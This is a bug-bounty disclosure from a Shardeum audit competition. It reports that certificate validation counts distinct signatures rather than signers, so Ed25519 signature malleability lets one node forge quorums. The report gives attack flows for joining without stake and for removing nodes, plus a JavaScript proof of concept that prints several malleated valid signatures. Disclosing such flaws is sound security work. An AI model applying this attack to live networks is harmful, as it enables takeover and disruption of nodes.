# #39838 \[BC-Critical] Bypass certificate signing validation by double counting signatures due to signature malleability

**Submitted on Feb 8th 2025 at 18:38:00 UTC by @Blockian for** [**Audit Comp | Shardeum: Core III**](https://immunefi.com/audit-competition/audit-comp-shardeum-core-iii)

* **Report ID:** #39838
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/shardeum/shardus-core/tree/bugbounty>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)
  * Bypassing Staking Requirements

## Description

## Impact

1. Bypass stake certificate validation, allowing for non-staking nodes and network take-over
2. Bypass nodes removal validation, allowing to remove nodes from the network

* Note: same impact as reports [`33222`](https://reports.immunefi.com/shardeum-core/33222-bc-critical-an-attacker-can-control-which-nodes-can-and-can...) and [34252](https://reports.immunefi.com/shardeum-core/34252-bc-critical-bypass-certificate-signing-validation) but a different root cause.

## Root Cause

The function `validateClosestActiveNodeSignatures` counts unique signatures, a single keypair can be used to prepare many different valid signatures of the same object.

## Attack Flow

### Staking

* Malicious node generates a fake `JoinRequest` with a fake `StakingCertificate`
  * It brute-forces `StakingCertificate` fields to make sure its one of the closest nodes to the hash of the staking certificates. This is easy, as only 1 node is needed to be close.
* It creates the full `JoinRequest`, with multiple different signatures signed by him, instead of signatures from many other nodes.
* It calls `gossip-join-request`
* Other nodes receive the join request, and validate it using `validateClosestActiveNodeSignatures`.
* The validation bypasses, as the signatures are valid and different.
* The new node joins the network without staking.

### Kicking a node

* Malicious node generates a fake `RemoveCertificate`.
* It fills it with different signatures signed by him, instead of signatures from many other nodes.
* It calls `remove-by-app` gossip route.
* Other nodes receive the certificate, and validate it using `validateClosestActiveNodeSignatures`.
* The validation bypasses, as the signatures are valid and different.
* The victim node is kicked from the network.

## Deep Dive

The function [`validateClosestActiveNodeSignatures`](https://github.com/shardeum/core/blob/bugbounty/src\shardus\index.ts#L1975-L1975) uses [`Crypto.verify`](https://github.com/shardeum/core/blob/bugbounty/src\crypto\index.ts#L203-L203) which uses [`lib-crypto-utils`](https://github.com/shardeum/lib-crypto-utils/)' [`verifyObj`](https://github.com/shardeum/lib-crypto-utils/blob/bugbounty/src\index.ts#L442-L442) which calls [`verify`](https://github.com/shardeum/lib-crypto-utils/blob/bugbounty/src\index.ts#L416-L416) which verifies an Ed25591 signature.\
These signatures are vulnerable to [signature malleability](https://en.wikipedia.org/wiki/Malleability_\(cryptography\)) (can be also tested [here](https://slowli.github.io/ed25519-quirks/malleability/))

## Suggested Fix

1. Count signers and not signatures.
2. Somehow fix the malleability issue, I'm not sure how without going into libSodium.

## Severity

This allows to take over the network (by kicking nodes / adding nodes) and so it critical.\
In addition, this is the same as [`33222`](https://reports.immunefi.com/shardeum-core/33222-bc-critical-an-attacker-can-control-which-nodes-can-and-can...) and [34252](https://reports.immunefi.com/shardeum-core/34252-bc-critical-bypass-certificate-signing-validation) which were treated as critical.

## Proof of Concept

## POC

Due to the 2 POCs in `39768` and `39679` I only created a POC to show the signature checking issue, and not the signature counting issue.

```js
import crypto from '@shardus/crypto-utils';

crypto.init("69fa4195670576c0160d660c3be36556ff8d504725be8a59b5a96509e0c994bc")
const owner = "60bdd2e80a409e55c410bc84c7365cf2ea7ec74fb1b55b2812d3409533999926"
const main = async  () => {
    console.log(crypto.verifyObj({"a": 1, "sign": {"owner": owner, "sig": "c8ac5deacd1641fda532bcd64b19dff5776f7e9c5a8a1da226366b6c8e2a624a2d04602749cc0bdcf0c50ec8193eb3a04145950c2cc54f3f4fc92c0a1a3fa50e2447f7fd6f64497c69225631fec93a02f4c323db671d99fdd999a968c776f008"}}))
    console.log(crypto.verifyObj({"a": 1, "sign": {"owner": owner, "sig": "42954198969ced37d50afa4febce20b2d960152f066b03c2043768166b80bc9296e9b2391c7d7079c74249da5912e820544c565b1e746bbb2f263a9ea9ced9082447f7fd6f64497c69225631fec93a02f4c323db671d99fdd999a968c776f008"}}))
    console.log(crypto.verifyObj({"a": 1, "sign": {"owner": owner, "sig": "ba4164fae0c33ed5ff53b89cd9423fa934b78dc82eedfd88459b038ec3c63d86c248aa90eb98bac59373c403b2fd11614de5161268b3b35300d7547926ead0002447f7fd6f64497c69225631fec93a02f4c323db671d99fdd999a968c776f008"}}))
    console.log(crypto.verifyObj({"a": 1, "sign": {"owner": owner, "sig": "24ca7c14b3eb3962d7cd0444d3e64c6dba430aafda74e4897b38c31f369e9e2eba53dd4d5ca0b4e3978da43f0d982e11a94cc92b55acb4ff9254424b24f98b0f2447f7fd6f64497c69225631fec93a02f4c323db671d99fdd999a968c776f008"}}))
    console.log(crypto.verifyObj({"a": 1, "sign": {"owner": owner, "sig": "a00486748623ab48835c48efcdf8101997c1db7307e083fa0d3a2544cba810f89e12fa69092f873f7a1500f36eedb6852f22e12f36731d3039c4490896490a0b2447f7fd6f64497c69225631fec93a02f4c323db671d99fdd999a968c776f008"}}))
    console.log(crypto.verifyObj({"a": 1, "sign": {"owner": owner, "sig": "2fb4cf1f31e711d6c045ac59f62d72250cc74ecccdcfb795807d0ba15cba119d2477a795c2b51fd01038558af824ecdda0666db0dd052bb60d2aef3f6ae3b1052447f7fd6f64497c69225631fec93a02f4c323db671d99fdd999a968c776f008"}}))
    console.log(crypto.verifyObj({"a": 1, "sign": {"owner": owner, "sig": "6e8f5479c46f447833b3fddeac8e571d880987e4725d33eb3dc82ba738671d949345d978b5adc1865c946c3041b050b2b0f7fd1ef7ea1f1f6e5d20ae5f960f042447f7fd6f64497c69225631fec93a02f4c323db671d99fdd999a968c776f008"}}))
    console.log(crypto.verifyObj({"a": 1, "sign": {"owner": owner, "sig": "a9912e35d0601733b75d0993fda3a14d7ab1b32e92f41821ab572eaa27aa168868ffcbde18bd839af3fa732e562243c7440027f7810305a8696ae4b70a4e2e042447f7fd6f64497c69225631fec93a02f4c323db671d99fdd999a968c776f008"}}))
    console.log(crypto.verifyObj({"a": 1, "sign": {"owner": owner, "sig": "0be2c9769c2a20ea1ff020a520c798d486463c89267bfd152023b005214ab169d4fbf93e151defd67a8ac323972b06200cb8053a6e2c1483815cae97e44067042447f7fd6f64497c69225631fec93a02f4c323db671d99fdd999a968c776f008"}}))
    console.log(crypto.verifyObj({"a": 1, "sign": {"owner": owner, "sig": "a0de7d9676c0a42fe4b5109a68fe099f7f633b8e448d3b4545fd35123c5088c6799361c605e21cd48ac5525dd53afe37cf4a660ede43a2c11dd6aa8facb579072447f7fd6f64497c69225631fec93a02f4c323db671d99fdd999a968c776f008"}}))
}

main();
```
